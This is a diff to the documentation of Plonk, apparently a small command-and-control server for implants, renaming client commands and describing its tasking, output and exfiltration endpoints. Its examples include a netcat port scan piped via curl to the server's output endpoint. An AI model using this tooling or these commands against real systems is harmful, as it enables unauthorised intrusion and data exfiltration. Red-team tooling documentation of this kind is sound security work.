@@ -30,17 +30,16 @@ Tasking (`/t`)
 ------------
 Plonk maintains a per-Implant ID task queue.  A task is retrieved by making a
 request for `/t/<ID>`.  Tasks are queued in the client by selecting an implant
-with `,seti` and then giving the task as a command, or, alternatively, with
-`,task`.
+with `,i` and then giving the task as a command.
 
 Tasking sent to the implant will have a newline appended.
 
 ### Example
 #### Client:
 ```
-(plonk)> ,seti kittens
+(plonk)> ,i kittens
 2023/12/30 00:29:05 Interacting with kittens
-2023/12/30 00:29:05 Use ,logs to return to watching Plonk's logs
+2023/12/30 00:29:05 Use ,l to return to watching Plonk's logs
 kittens> ps awwwfux
 2023/12/30 00:29:09 [TASKQ] Task queued by stuart for kittens (qlen 1)
 ps awwwfux
@@ -56,13 +55,13 @@ Output (`/o`)
 Output is sent back as the body of a request to `/o/<ID>` which may either be a
 short request with one chunk of output or a long-lived requst to stream output.
 Output is logged and printed to any user which has that ID selected with
-`,seti`.  By default, only 1MB of output will be accepted.  Larger amounts of
-data may be sent via [`/p`](#exfil-p).
+`,i`.  By default, only 1MB of output will be accepted.  Larger amounts of data
+may be sent via [`/p`](#exfil-p).
 
 It's not necessary to have a [`/c`-generated](#implant-generation-c) implant
 running.  Anything may be sent to `/o` with any ID, using Plonk as a sort of
-generic logger.  Don't forget to `,seti <ID>` before sending output to see it
-in real-time.  It will still be logged, `,seti` or not, of course.
+generic logger.  Don't forget to `,i <ID>` before sending output to see it
+in real-time.  It will still be logged, `,i` or not, of course.
 
 ### Examples
 Grab some tasking, using the ID `kittens`.
@@ -95,9 +94,9 @@ nc -zw1 100.100.100.2 1-65535 2>&1 | curl -T. http://127.0.0.1:8080/o/portscan
 
 #### Client:
 ```
-(plonk)> ,seti portscan
+(plonk)> ,i portscan
 2024/01/17 20:41:26 Interacting with portscan
-2024/01/17 20:41:26 Use ,logs to return to watching Plonk's logs
+2024/01/17 20:41:26 Use ,l to return to watching Plonk's logs
 2024/01/17 20:41:50 [OUTPUT] From portscan
 Connection to 100.100.100.2 21 port [tcp/ftp] succeeded!
 2024/01/17 20:41:50 [OUTPUT] From portscan
@@ -210,7 +209,7 @@ disabled altogether with `-exfil-max 0`.
 
 The first element of the path after `/p` is assumed to be an Implant ID, though
 in practice this isn't strictly necessary.  Using an Implant ID has the nice
-effect of showing it if that ID has been selected with `,seti`.
+effect of showing it if that ID has been selected with `,i`.
 
 ### Example
 #### Target:
